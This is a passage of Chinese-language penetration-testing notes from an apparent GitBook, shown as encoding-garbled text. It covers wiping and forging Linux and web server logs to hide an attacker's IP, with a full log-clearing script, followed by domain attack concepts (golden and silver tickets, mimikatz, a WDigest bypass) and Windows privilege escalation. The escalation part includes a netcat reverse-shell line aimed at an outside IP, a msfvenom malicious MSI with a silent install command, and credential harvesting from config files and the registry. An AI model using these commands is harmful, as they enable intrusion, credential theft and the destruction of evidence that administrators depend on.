æ—¥å¿—æ–‡ä»¶å…¨éƒ¨è¢«æ¸…ç©ºï¼Œå¤ªå®¹æ˜“è¢«ç®¡ç†å‘˜å¯Ÿè§‰äº†ï¼Œå¦‚æœåªæ˜¯åˆ é™¤æˆ–æ›¿æ¢éƒ¨åˆ†å…³é”®æ—¥å¿—ä¿¡æ¯ï¼Œé‚£ä¹ˆå°±å¯ä»¥å®Œç¾éšè—æ”»å‡»ç—•è¿¹ã€‚ æ›¿æ¢ï¼š # 192.168.100.101ä¸ºæ”»å‡»è€…IPï¼Œ10.0.0.55ä¸ºä¼ªé€ IPï¼Œ-iç¼–è¾‘æ–‡ä»¶ sed 's/192.168.100.101/10.0.0.55/g' -i /var/log/btmp* sed 's/192.168.100.101/10.0.0.55/g' -i /var/log/lastlog sed 's/192.168.100.101/10.0.0.55/g' -i /var/log/wtmp sed 's/192.168.100.101/10.0.0.55/g' -i secure sed 's/192.168.100.101/10.0.0.55/g' -i /var/log/utmp åˆ é™¤ï¼š # åˆ é™¤æ‰€æœ‰åŒ¹é…åˆ°å­—ç¬¦ä¸²çš„è¡Œ,æ¯”å¦‚ä»¥å½“å¤©æ—¥æœŸæˆ–è€…è‡ªå·±çš„ç™»å½•ip sed -i '/è‡ªå·±çš„ip/'d /var/log/messages sed -i '/å½“å¤©æ—¥æœŸ/'d filename ä¸€é”®æ¸…é™¤historyå’Œç³»ç»Ÿæ—¥å¿—è„šæœ¬ #!/usr/bin/bash echo > /var/log/syslog echo > /var/log/messages echo > /var/log/httpd/access_log echo > /var/log/httpd/error_log echo > /var/log/xferlog echo > /var/log/secure echo > /var/log/auth.log echo > /var/log/user.log echo > /var/log/wtmp echo > /var/log/lastlog echo > /var/log/btmp echo > /var/run/utmp rm ~/./bash_history history -c æ¸…é™¤webæ—¥å¿—ç—•è¿¹ webæ—¥å¿—åŒæ ·å¯ä»¥ä½¿ç”¨sedè¿›è¡Œä¼ªé€ ï¼Œä¾‹å¦‚apacheæ—¥å¿—ã€MySQLæ—¥å¿—ã€phpæ—¥å¿— sed 's/192.168.100.101/10.0.0.55/g' â€“i /var/log/apache/access.log sed 's/192.168.100.101/10.0.0.55/g' â€“i /var/log/apache/error_log sed 's/192.168.100.101/10.0.0.55/g' â€“i /var/log/mysql/mysql_error.log sed 's/192.168.100.101/10.0.0.55/g' â€“i /var/log/mysql/mysql_slow.log sed 's/192.168.100.101/192.168.1.4/g' â€“i /var/log/apache/php_error.log æ¸…é™¤éƒ¨åˆ†ç›¸å…³æ—¥å¿—ï¼š # ä½¿ç”¨grep -væ¥æŠŠæˆ‘ä»¬çš„ç›¸å…³ä¿¡æ¯åˆ é™¤ cat /var/log/nginx/access.log | grep -v evil.php > tmp.log # æŠŠä¿®æ”¹è¿‡çš„æ—¥å¿—è¦†ç›–åˆ°åŸæ—¥å¿—æ–‡ä»¶ cat tmp.log > /var/log/nginx/access.log/ å‚è€ƒ https://cloud.tencent.com/developer/article/1698537 https://www.freebuf.com/articles/system/266458.html https://www.cnblogs.com/xiaozi/p/13648156.html Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2023-10-27 17:07:10 "},"02.åæ¸—é€/WindowsåŸŸæ¸—é€/åæ¸—é€ä¹‹äº†è§£.html":{"url":"02.åæ¸—é€/WindowsåŸŸæ¸—é€/åæ¸—é€ä¹‹äº†è§£.html","title":"åæ¸—é€ä¹‹äº†è§£","keywords":"","body":"ç›®æ ‡ å†…ç½‘æ¸—é€æµ‹è¯•çš„ç›®æ ‡ä¸€èˆ¬æ˜¯è·å–ç‰¹å®šæœºå™¨çš„æƒé™æˆ–è€…ç‰¹å®šç”¨æˆ·ï¼Œè¿›è€Œè·å¾—ç‰¹å®šçš„èµ„æºï¼Œå¯¹å†…ç½‘çš„å®‰å…¨æ€§è¿›è¡Œè¯„ä¼°ã€‚ æœ¬æœºä¿¡æ¯æ”¶é›† æœ¬æœºä¿¡æ¯åŒ…æ‹¬OSã€æƒé™ã€å†…ç½‘IPæ®µã€æ€è½¯ã€ç«¯å£ã€æœåŠ¡ã€è¡¥ä¸æ›´æ–°é¢‘ç‡ã€ç½‘ç»œè¿æ¥ã€å…±äº«ã€ä¼šè¯ç­‰ã€‚å¦‚æœæ˜¯åŸŸå†…ä¸»æœºï¼ŒOSã€åº”ç”¨è½¯ä»¶ã€è¡¥ä¸ã€æœåŠ¡ã€æ€è½¯è¿™äº›ä¸€èˆ¬éƒ½æ˜¯æ‰¹é‡å®‰è£…çš„ã€‚ åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸ è·å¾—æœ¬æœºç›¸å…³ä¿¡æ¯ä¹‹åï¼Œå°±è¦åˆ¤æ–­å½“å‰å†…ç½‘ä¸­æ˜¯å¦å­˜åœ¨åŸŸã€‚å¦‚æœå½“å‰å†…ç½‘å­˜åœ¨åŸŸï¼Œåˆ™éœ€è¦åˆ¤æ–­æ‰€æ§ä¸»æœºæ˜¯å¦åœ¨åŸŸå†…ã€‚ åŸŸå†…åŸºç¡€ä¿¡æ¯æ”¶é›† ä¸»æœº ç”¨æˆ·å’Œç”¨æˆ·ç»„ è®¡ç®—æœºåˆ—è¡¨ å¯†ç ç­–ç•¥ åŸŸæ§ åŸŸç®¡ç†å‘˜ åŸŸç®¡ç†è¿›ç¨‹ æ ¸å¿ƒä¸šåŠ¡æœºå™¨ æ•æ„Ÿæ–‡ä»¶ åŸŸå†…ç½‘æ®µåˆ’åˆ†æƒ…å†µåŠæ‹“æ‰‘ç»“æ„ æ„å»ºéš§é“ åˆ¤æ–­å†…ç½‘è¿é€šæ€§æ„å»ºç›¸åº”éš§é“ ç«¯å£è½¬å‘ éµå¾ªä¸‰ä¸ªåŸåˆ™ ç¨³å®šæ€§ï¼ˆä¸»è¦ç”¨äºæ‰«æï¼‰{ æ”¯æŒé«˜å¹¶å‘ã€è‡ªåŠ¨æ–­çº¿é‡è¿ } å®‰å…¨æ€§ï¼ˆé˜²æ­¢socks5ç›´æ¥è¢«banï¼‰{ æµé‡å¯åŠ å¯†ã€å¼€æ”¾ä»£ç†å¯è®¾ç½®è®¤è¯ } å¥å£®æ€§ { æ”¯æŒå¤šç§åè®®æ–¹å¼ã€æœ€å¥½æ”¯æŒæ’ä»¶å®šåˆ¶ } æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœº åœ¨è¿›è¡ŒåŸŸå†…å­˜æ´»ä¸»æœºæ¢æµ‹çš„æ—¶å€™ï¼Œæœ‰å‡ ä¸ªæ³¨æ„ç‚¹ï¼š å°½é‡é¿å…è§¦å‘åŸŸå†…çš„ä¸€äº›é˜²ç—…æ¯’è½¯ä»¶çš„å‘Šè­¦å’Œæ‹¦æˆªï¼› åœ¨éæˆæƒæƒ…å†µä¸‹ï¼Œé¿å…ä½¿ç”¨å·¥å…·è¿›è¡Œæš´åŠ›æ‰«æï¼› å°½é‡é¿å…åœ¨ç›®æ ‡æœºå­ä¸Šä½¿ç”¨å›¾å½¢åŒ–å·¥å…·ï¼› å°½é‡ä½¿ç”¨ç³»ç»Ÿè‡ªå¸¦çš„å·¥å…·è¿›è¡Œæ¢æµ‹ï¼Œå¦‚powershellè„šæœ¬ï¼› åŸŸå†…å­˜æ´»ä¸»æœºç«¯å£æ‰«æ ä¸€èˆ¬ç«¯å£æ‰«æéœ€è¦å…³æ³¨å¦‚ä¸‹ä¸‰ç‚¹ï¼š ç«¯å£çš„Bannerä¿¡æ¯ï¼› ç«¯å£ä¸Šè¿è¡Œçš„æœåŠ¡ï¼› å¸¸è§æœåŠ¡çš„é»˜è®¤ç«¯å£å·ï¼› æ¨ªå‘ç§»åŠ¨ â†’ æ‹¿ä¸‹åŸŸæ§ ä¸ºä»€ä¹ˆè¦æ‹¿ä¸‹åŸŸæ§å‘¢ï¼Ÿ æ´»åŠ¨ç›®å½•æ˜¯ä¸€ç§åŸºäºWindowsçš„ç›®å½•æœåŠ¡ï¼Œç”¨äºå­˜å‚¨å¹¶å‘å†…éƒ¨ç½‘ç»œç¯å¢ƒæä¾›æ•°æ®å¯¹è±¡ã€‚å®ƒå…è®¸é›†ä¸­ç®¡ç†èº«ä»½éªŒè¯å’Œæˆæƒã€‚ ADåŒ…å«æœ‰å…³ç½‘ç»œå’Œç¯å¢ƒçš„åŸºæœ¬ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç”¨æˆ·ã€è®¡ç®—æœºã€æ‰“å°æœºç­‰ã€‚ä¾‹å¦‚ï¼ŒAD å¯èƒ½åŒ…å«ç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯ï¼Œå¦‚èŒä½ã€ç”µè¯å·ç ã€åœ°å€ã€å¯†ç ã€ç»„ã€æƒé™ç­‰ã€‚ è€Œè¦æƒ³å®ç°åŸŸç¯å¢ƒï¼Œå°±å¿…é¡»è¦è®¡ç®—æœºä¸­å®‰è£…æ´»åŠ¨ç›®å½•ã€‚ å¦‚æœè¯´åœ¨å†…ç½‘ä¸­çš„ä¸€å°è®¡ç®—æœºä¸Šå®‰è£…äº†æ´»åŠ¨ç›®å½•ï¼Œé‚£å®ƒå°±å˜æˆäº†åŸŸæ§åˆ¶å™¨ã€‚ Webæ‰‹æ®µ å¸¸è§Webï¼Œä¸»æœºæ¼æ´ é›†æƒç³»ç»Ÿï¼š exchange vencenter å¯†ç å–·æ´’ å„ç§æ”¶é›†åˆ°çš„å‡­è¯+å¯†ç å–·æ´’ åŸŸå†…æ‰‹æ³• åè®®æ”»å‡» NTLMåè®® Kerberosåè®® è¾…åŠ© å…æ€ ç»•è¿‡é˜²æŠ¤è½¯ä»¶æ¯”å¦‚AVï¼ŒIDSï¼ŒIPSï¼ŒEDR æƒé™æå‡ å¾ˆå¤šæ“ä½œéƒ½éœ€è¦é«˜æƒé™æ‰èƒ½åš æƒé™ç»´æŒå’Œç—•è¿¹æ¸…ç† æ”»å‡»è¿‡ç¨‹ä¸æ˜¯ä¸€è¹´è€Œå°±çš„ï¼Œéœ€è¦é˜²æ­¢åœ¨æ”»å‡»è¿‡ç¨‹ä¸­è¢«å‘ç°å’ŒæŸ¥æ€ï¼Œå¯¼è‡´æ”»å‡»å¤±è´¥ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-28 15:28:12 "},"02.åæ¸—é€/WindowsåŸŸæ¸—é€/åæ¸—é€ä¹‹åŸºç¡€çŸ¥è¯†.html":{"url":"02.åæ¸—é€/WindowsåŸŸæ¸—é€/åæ¸—é€ä¹‹åŸºç¡€çŸ¥è¯†.html","title":"åæ¸—é€ä¹‹åŸºç¡€çŸ¥è¯†","keywords":"","body":"å·¥ä½œç»„ä¸åŸŸ å·¥ä½œç»„,åŸŸ,åŸŸæ§æ˜¯ä»€ä¹ˆåŠå®ƒä»¬ä¹‹é—´çš„ä¸€äº›å…³ç³» | APT404-ä¸ä½œæ¶ å·¥ä½œç»„å°±æ˜¯æŠŠä¸€äº›å…·æœ‰ç›¸åŒèŒèƒ½(æ¯”å¦‚,å¯ä»¥æŒ‰éƒ¨é—¨,æŒ‰æˆ¿é—´å·,æŒ‰å²—ä½,æŒ‰æ“ä½œç³»ç»Ÿç±»å‹ç­‰çš„ä¸åŒè¿›è¡Œåˆ†ç»„ç®¡ç†)çš„æœºå™¨éƒ½æ”¾åˆ°ä¸€ä¸ªç»„é‡Œã€‚ å®é™…ä¸Šå·¥ä½œç»„åªæ˜¯å½¢å¼ä¸Šçš„æŠŠå¤§å®¶æ”¾åœ¨äº†ä¸€èµ·è€Œå·²,å¹¶ä¸å­˜åœ¨çœŸæ­£çš„é›†ä¸­ç®¡ç†ä½œç”¨,å·¥ä½œç»„å†…çš„æ¯å°æœºå™¨ä¾ç„¶æ˜¯ç›¸äº’ç‹¬ç«‹,äº’ä¸å¹²æ¶‰,å„è‡ªä¸ºæ”¿çš„ã€‚å¦‚æœè¦è®¿é—®å·¥ä½œç»„ä¸­å…¶ä»–ä¸»æœºçš„èµ„æºï¼Œéœ€è¦æä¾›è¯¥ä¸»æœºçš„è´¦å·å¯†ç ã€‚ åŸŸï¼Œé€šè¿‡åŸŸç®¡ç†å‘˜ç®¡ç†åŸŸæ§ï¼ˆDCï¼‰æ¥å¯¹åŸŸå†…ä¸»æœºè¿›è¡Œç®¡ç†ï¼Œè¦æƒ³è®¿é—®åŸŸå†…ä¸»æœºèµ„æºï¼Œå°±è¦æˆä¸ºåŸŸå†…ç”¨æˆ·ï¼Œå¹¶å—é™äºèº«ä»½ã€‚ åŸŸç®¡ç†å‘˜å¯ä»¥ä»»æ„æ“ä½œåŸŸå†…çš„ä»»æ„ä¸€å°ä¸»æœºï¼ˆå½“ä¸»æœºåŠ å…¥åŸŸä¸­æ—¶ï¼ŒåŸŸæ§å°±ä¼šå‘è¯¥ä¸»æœºçš„æœ¬åœ°ç®¡ç†ç»„ä¸­åŠ å…¥åŸŸç®¡ç†å‘˜è´¦æˆ·ï¼‰ åŸŸæ§æœåŠ¡å™¨ä¸Šçš„ç”¨æˆ·é»˜è®¤ä¸ºåŸŸç”¨æˆ· ADï¼ˆ Active Directory ï¼‰ï¼šä¿å­˜åŸŸç”¨æˆ·èº«ä»½å‡­è¯ Windowsèº«ä»½è®¤è¯æœºåˆ¶ åŸŸæ¸—é€å­¦ä¹ ï¼ˆä¸€ï¼‰Windowsè®¤è¯æœºåˆ¶ | AresX's Blog æœ¬åœ°è®¤è¯ æŒ‡ç”¨æˆ·ç›´æ¥æ“ä½œè®¡ç®—æœºç™»é™†è´¦æˆ· æœ¬åœ°è®¤è¯ä¸­ç”¨æ¥å¤„ç†ç”¨æˆ·è¾“å…¥å¯†ç çš„è¿›ç¨‹å³lsass.exe,å¯†ç ä¼šåœ¨è¿™ä¸ªè¿›ç¨‹ä¸­æ˜æ–‡ä¿å­˜ï¼Œä¾›è¯¥è¿›ç¨‹å°†å¯†ç è®¡ç®—æˆNTLM Hashä¸samè¿›è¡Œæ¯”å¯¹ã€‚æˆ‘ä»¬ä½¿ç”¨mimikatzæ¥è·å–çš„æ˜æ–‡å¯†ç ï¼Œä¾¿æ˜¯åœ¨è¿™ä¸ªè¿›ç¨‹ä¸­è¯»å–åˆ°çš„ ç½‘ç»œè®¤è¯netNTLM æŒ‘æˆ˜å“åº”æœºåˆ¶ åŸŸè®¤è¯--Kerberosåè®® åŸŸæ¸—é€å­¦ä¹ ï¼ˆäºŒï¼‰Kerberosåè®® | AresX's Blog å‚ä¸è®¤è¯çš„ä¸‰ä¸ªè§’è‰²çš„NTLM Hashæ˜¯ä¸‰ä¸ªå¯†é’¥ï¼Œè¿™ä¸‰ä¸ªNTLM Hashçš„å”¯ä¸€ä½œç”¨æ˜¯ç¡®ä¿ä¼šè¯å¯†é’¥Sessionkeyçš„å®‰å…¨ä¼ è¾“ éªŒè¯èº«ä»½ æ”¶åˆ°ä¸¤ä¸ªæ¶ˆæ¯ï¼Œéƒ½æ˜¯å…ˆç”¨è‡ªå·±çš„NTLMå“ˆå¸Œè¿›è¡Œè§£å¯†ï¼Œå¾—åˆ°ä¼šè¯å¯†é’¥å’Œcilent idï¼Œæ—¶é—´æˆ³ï¼Œå†ç”¨ä¼šè¯å¯†é’¥å¯¹å¦ä¸€ä¸ªæ¶ˆæ¯è¿›è¡Œè§£å¯†ï¼Œå¾—åˆ°å¦ä¸€ç»„cilent idå’Œæ—¶é—´æˆ³ï¼Œå°†è§£å¯†å¾—åˆ°çš„è¿™ä¸¤ç»„cilent idå’Œæ—¶é—´æˆ³è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœç›¸åŒï¼Œåˆ™éªŒè¯æˆåŠŸã€‚ é»„é‡‘ç¥¨æ®TGT(Ticket Granting Ticket) ç”¨äºèº«ä»½è®¤è¯ï¼Œå­˜å‚¨åœ¨å†…å­˜ï¼Œé»˜è®¤æœ‰æ•ˆæœŸä¸º10å°æ—¶ å†…å®¹ä¸ºClient/TGS Sessionkeyå’Œcilent idï¼Œæ—¶é—´æˆ³ï¼Œç”±KDCä¸­çš„ASç”¨KDCå¯†é’¥ï¼ˆå³TGSå¯†é’¥/KDCæœåŠ¡å™¨krbtgtç”¨æˆ·çš„NTLM Hashï¼‰åŠ å¯†å¾—åˆ° ï¼ˆå‘KDCè¯·æ±‚èº«ä»½è®¤è¯ï¼Œæ‰€ä»¥ç”¨KDCå¯†é’¥åŠ å¯†ï¼‰ ç™½é“¶ç¥¨æ®TGS(Ticket Granting Server) å†…å®¹ä¸ºClient/Server Sessionkeyå’Œcilent idï¼Œæ—¶é—´æˆ³,ç”±KDCä¸­çš„TGSç”¨Serverå¯†é’¥(æœåŠ¡å™¨çš„NTLMHASH)åŠ å¯†å¾—åˆ° ï¼ˆå‘Serverè¯·æ±‚æœåŠ¡ï¼Œæ‰€ä»¥ç”¨Serverå¯†é’¥åŠ å¯†ï¼‰ äºŒè€…åŒºåˆ« é»„é‡‘ç¥¨æ®ï¼Œè·å–KDCç”¨æˆ·ï¼ˆkrbtgç”¨æˆ·çš„hashå€¼ï¼‰å°±å¯ä»¥ä¼ªé€ ä»»æ„ç”¨æˆ·çš„é»„é‡‘ç¥¨æ®ä»è€Œå®ç°å¯¹åŸŸå†…ä»»æ„æœºå™¨çš„ä¸€ä¸ªè®¿é—®ã€‚ ç™½é“¶ç¥¨æ®ï¼Œå½“è·å–åˆ°åŸŸå†…æœºå™¨ç”¨æˆ·çš„hashå€¼å°±å¯ä»¥ä¼ªé€ ä¸€ä¸ªçœŸæ­£çš„ç™½é“¶ç¥¨æ®ã€‚å®ç°å¯¹æŸä¸ªæœºå™¨ç‰¹å®šæœåŠ¡çš„è®¿é—®ã€‚ ä»–ä»¬ä¸¤ä¸ªåŒºåˆ«å°±åœ¨é»„é‡‘ç¥¨æ®ä½œç”¨æ›´å¤§è·å¾—TGTç¥¨æ®åå¯ä»¥è®¿é—®ä»»æ„æœºå™¨ä»»æ„æœåŠ¡ï¼Œç™½é“¶åªèƒ½æŒ‡å®šæœºå™¨æŒ‡å®šæœåŠ¡ã€‚ mimikatz åŸç† æœ¬åœ°è®¤è¯ä¸­ç”¨æ¥å¤„ç†ç”¨æˆ·è¾“å…¥å¯†ç çš„è¿›ç¨‹å³lsass.exe,å¯†ç ä¼šåœ¨è¿™ä¸ªè¿›ç¨‹ä¸­æ˜æ–‡ä¿å­˜ï¼Œä¾›è¯¥è¿›ç¨‹å°†å¯†ç è®¡ç®—æˆNTLM Hashä¸samè¿›è¡Œæ¯”å¯¹ æˆ‘ä»¬ä½¿ç”¨mimikatzæ¥è·å–çš„æ˜æ–‡å¯†ç ï¼Œä¾¿æ˜¯åœ¨è¿™ä¸ªè¿›ç¨‹ä¸­è¯»å–åˆ°çš„ ä½¿ç”¨æ³¨æ„äº‹é¡¹ éœ€è¦é«˜æƒé™ï¼Œå¯ä»¥å…ˆç”¨privailgeæ¨¡å—ææƒ è¡¥ä¸ å®‰è£…äº†KB2871997è¡¥ä¸æˆ–è€…ç³»ç»Ÿç‰ˆæœ¬å¤§äºwindows server 2012æ—¶ï¼Œlsass.exeä¸ä¿å­˜æ˜æ–‡å¯†ç ä¸ä¿å­˜æ˜æ–‡çš„å¯†ç ã€‚ ç»•è¿‡ # å¯ç”¨Wdigest Authï¼Œå†…å­˜ä¸­è¿˜æ˜¯ä¼šä¿å­˜ç³»ç»Ÿçš„æ˜æ–‡å£ä»¤ å°†ä¸‹åˆ—æ³¨å†Œè¡¨è·¯å¾„çš„ HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest ä»¥ä¸‹é¡¹çš„ UseLogonCredential å€¼ä¿®æ”¹æˆ0æˆ–1 0ï¼šå…³é—­Wdigest Auth 1ï¼šå¯åŠ¨Wdigest Auth Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-24 23:04:03 "},"02.åæ¸—é€/WindowsåŸŸæ¸—é€/åæ¸—é€ä¹‹æƒé™æå‡.html":{"url":"02.åæ¸—é€/WindowsåŸŸæ¸—é€/åæ¸—é€ä¹‹æƒé™æå‡.html","title":"åæ¸—é€ä¹‹æƒé™æå‡","keywords":"","body":"ææƒçš„æœ¬è´¨ åˆ©ç”¨æƒé™é…ç½®çš„å¤±è¯¯ æ•°æ®åº“ææƒ éœ€è¦æœåŠ¡å™¨å¼€å¯æ•°æ®åº“æœåŠ¡åŠè·å–åˆ°æœ€é«˜æƒé™ç”¨æˆ·å¯†ç ã€‚ é™¤ Access æ•°æ®åº“å¤–ï¼Œå…¶ä»–æ•°æ®åº“åŸºæœ¬éƒ½å­˜åœ¨æ•°æ®åº“ææƒçš„å¯èƒ½ã€‚ MYSQL å›½å…‰å¸ˆå‚…æ€»ç»“ UDFææƒåªèƒ½è·å¾—mysqlçš„è¿è¡Œæƒé™ï¼Œå¯¹äºlinuxç³»ç»Ÿï¼Œé»˜è®¤ç»™mysqlåˆ†é…ä¸€ä¸ª\"mysql:mysql\"ç”¨æˆ·ï¼Œæ‰€ä»¥å¯¹äºlinuxç³»ç»Ÿæ¥è¯´è¿™ä¸ªç»™ææƒæ²¡å•¥æ„ä¹‰ã€‚ Windowsææƒ å‰ç½®çŸ¥è¯† Windowsçš„æƒé™ï¼ˆç”¨æˆ·ã€ç»„å’Œè®¿é—®æ§åˆ¶ï¼‰_ ç›®çš„ ä» Webshellã€æ•°æ®åº“æƒâ€”> ç³»ç»Ÿæ™®é€šç”¨æˆ·æƒé™â€”>Administrator æƒé™â€”>System æƒé™ æ‰‹æ³• ç³»ç»Ÿé…ç½®é”™è¯¯ å·¥å…· mertdas/PrivKit: PrivKit is a simple beacon object file that detects privilege escalation vulnerabilities caused by misconfigurations on Windows OS. (github.com) æ£€æŸ¥æ¸…å• Checks for Unquoted Service Paths Checks for Autologon Registry Keys Checks for Always Install Elevated Registry Keys Checks for Modifiable Autoruns Checks for Hijackable Paths Enumerates Credentials From Credential Manager Looks for current Token Privileges è¯¥å·¥å…·ä¸ºCSçš„æ’ä»¶ï¼Œå¯¼å…¥ååœ¨beaconä¸­ä½¿ç”¨ beacon> privcheck å¯ä¿¡ä»»æœåŠ¡è·¯å¾„æ¼æ´ è·¯å¾„æ²¡æœ‰åŒ…å«åœ¨å¼•å·ä¸­ï¼ŒæœåŠ¡ä¼šæŒ‰ç…§ä»¥ä¸‹é¡ºåºä¾æ¬¡æ‰§è¡Œ c:\\program.exe c:\\program files.exe c:\\program files (x86)\\grasssoft\\macro.exe c:\\program files (x86)\\grasssoft\\macro expert\\MacroService.exe å¯ä»¥çœ‹åˆ° Windows å°è¯•æ‰§è¡Œäº†å››æ¬¡æ‰æ‰¾åˆ°çœŸæ­£çš„ç¨‹åºã€‚ ç”±äº Windows æœåŠ¡é€šå¸¸æ˜¯ä»¥ SYSTEM æƒé™è¿è¡Œçš„ï¼Œæ‰€ä»¥åœ¨ç³»ç»Ÿæ‰¾åˆ°ç©ºæ ¼å‰çš„ç¨‹åºå¹¶æ‰§è¡Œæ—¶ï¼Œä¹Ÿå°†ä»¥ SYSTEM æƒé™è¿è¡Œè¿™ä¸ªç¨‹åºã€‚ å³æˆ‘ä»¬æŠŠæœ¨é©¬ç¨‹åºå‘½åä¸º Program.exe ï¼Œç„¶åæ”¾åˆ° C ç›˜ä¸‹ï¼Œå½“ä¸Šé¢çš„æœåŠ¡é‡å¯æ—¶ï¼Œç³»ç»Ÿå°±ä¼šæ‰§è¡Œæˆ‘ä»¬çš„æœ¨é©¬ç¨‹åºã€‚ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹ç³»ç»Ÿä¸­é”™è¯¯é…ç½®çš„è·¯å¾„ wmic service get name,displayname,pathname,startmode |findstr /i \"Auto\" |findstr /i /v \"C:\\Windows\\\\\" |findstr /i /v \"\"\" é…ç½®æ–‡ä»¶ # è‡ªåŠ¨å®‰è£…é…ç½®æ–‡ä»¶ C:\\Unattend.xml C:\\Windows\\Panther\\Unattend.xml C:\\Windows\\Panther\\Unattend\\Unattend.xml C:\\Windows\\system32\\sysprep.inf C:\\Windows\\system32\\sysprep\\sysprep.xml # IISé…ç½®æ–‡ä»¶ C:\\inetpub\\wwwroot\\web.config C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config # æœç´¢å‡­è¯ type C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config | findstr connectionString PuTTYæ˜¯Windowsç³»ç»Ÿä¸Šå¸¸è§çš„SSHå®¢æˆ·ç«¯ã€‚ç”¨æˆ·ä¸å¿…æ¯æ¬¡éƒ½æŒ‡å®šè¿æ¥çš„å‚æ•°ï¼Œè€Œæ˜¯å¯ä»¥å°†ä¼šè¯å­˜å‚¨åœ¨IPã€ç”¨æˆ·å’Œå…¶ä»–é…ç½®å¯ä»¥å­˜å‚¨çš„åœ°æ–¹ï¼Œä»¥ä¾›ä»¥åä½¿ç”¨ã€‚è™½ç„¶PuTTYä¸å…è®¸ç”¨æˆ·å­˜å‚¨ä»–ä»¬çš„SSHå¯†ç ï¼Œä½†å®ƒä¼šå­˜å‚¨åŒ…æ‹¬æ˜æ–‡èº«ä»½éªŒè¯å‡­æ®çš„ä»£ç†é…ç½®ã€‚ è¦æ£€ç´¢å­˜å‚¨çš„ä»£ç†å‡­è¯ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åœ¨ä»¥ä¸‹æ³¨å†Œè¡¨é¡¹ä¸‹æœç´¢ProxyPassword: reg query HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\ /f \"Proxy\" /s æ³¨æ„:Simon Tathamæ˜¯PuTTYçš„åˆ›å»ºè€…(ä»–çš„åå­—æ˜¯è·¯å¾„çš„ä¸€éƒ¨åˆ†)ï¼Œè€Œä¸æ˜¯æˆ‘ä»¬æ­£åœ¨æ£€ç´¢å¯†ç çš„ç”¨æˆ·åã€‚è¿è¡Œä¸Šè¿°å‘½ä»¤åï¼Œå­˜å‚¨çš„ä»£ç†ç”¨æˆ·åä¹Ÿåº”è¯¥æ˜¯å¯è§çš„ã€‚ å°±åƒputtyå­˜å‚¨å‡­æ®ä¸€æ ·ï¼Œä»»ä½•å­˜å‚¨å¯†ç çš„è½¯ä»¶ï¼ŒåŒ…æ‹¬æµè§ˆå™¨ã€ç”µå­é‚®ä»¶å®¢æˆ·ç«¯ã€FTPå®¢æˆ·ç«¯ã€SSHå®¢æˆ·ç«¯ã€VNCè½¯ä»¶ç­‰ï¼Œéƒ½æœ‰æ¢å¤ç”¨æˆ·ä¿å­˜çš„ä»»ä½•å¯†ç çš„æ–¹æ³•ã€‚ å®šæ—¶ä»»åŠ¡ # æŸ¥è¯¢å®šæ—¶ä»»åŠ¡ schtasks /query # æŸ¥çœ‹æƒé™ icacls # å†™å…¥ echo c:\\tools\\nc64.exe -e cmd.exe 10.17.16.148 1234 > C:\\tasks\\schtask.bat æ¶æ„msiå®‰è£…ç¨‹åº å‰ç½®æ¡ä»¶ reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer msfç”Ÿæˆæ¶æ„msi msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.63.3 LPORT=LOCAL_PORT -f msi -o malicious.msi å—å®³æœºæ‰§è¡Œ msiexec /quiet /qn /i C:\\Windows\\Temp\\malicious.msi æˆ–è€…ä½¿ç”¨exploit/windows/local/always_install_elevatedæ¨¡å— å†å²å‘½ä»¤ cmd type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt powershell type $Env:userprofile\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt Saved Windows Credentials cmdkey /list runas /savecred /user:admin cmd.exe ä»¥è¿™ä¸ªç”¨æˆ·æƒé™å¼€å¯ä¸€ä¸ªæ–°çš„cmd Bypass UAC å·¥å…·hfiref0x/UACME: Defeating Windows User Account Control (github.com) ä»¤ç‰Œçªƒå– å·¥å…·BeichenDream/SharpToken: Windows Token Stealing Expert (github.com) åœ¨çº¢é˜Ÿæ¨ªå‘ç§»åŠ¨æœŸé—´ï¼Œæˆ‘ä»¬ç»å¸¸éœ€è¦çªƒå–å…¶ä»–ç”¨æˆ·çš„æƒé™ã€‚åœ¨ç°ä»£EDRçš„é˜²å¾¡ä¸‹ï¼Œæˆ‘ä»¬å¾ˆéš¾ä½¿ç”¨Mimikatzæ¥è·å–å…¶ä»–ç”¨æˆ·æƒé™ï¼Œå¦‚æœç›®æ ‡ç”¨æˆ·æ²¡æœ‰è¿›ç¨‹å­˜æ´»ï¼Œæˆ‘ä»¬ä¹Ÿæ²¡æœ‰åŠæ³•ä½¿ç”¨â€œOpenProcessTokenâ€æ¥çªƒå–Tokenã€‚ SharpTokenæ˜¯ä¸€ä¸ªåˆ©ç”¨Tokenæ³„æ¼çš„å·¥å…·ã€‚å®ƒå¯ä»¥ä»ç³»ç»Ÿä¸­çš„æ‰€æœ‰è¿›ç¨‹ä¸­æ‰¾åˆ°æ³„æ¼çš„ä»¤ç‰Œå¹¶ä½¿ç”¨å®ƒä»¬ã€‚å¦‚æœæ‚¨æ˜¯ä½æƒé™çš„æœåŠ¡ç”¨æˆ·ï¼Œç”šè‡³å¯ä»¥ä½¿ç”¨å®ƒæ¥å‡çº§åˆ°â€œNT 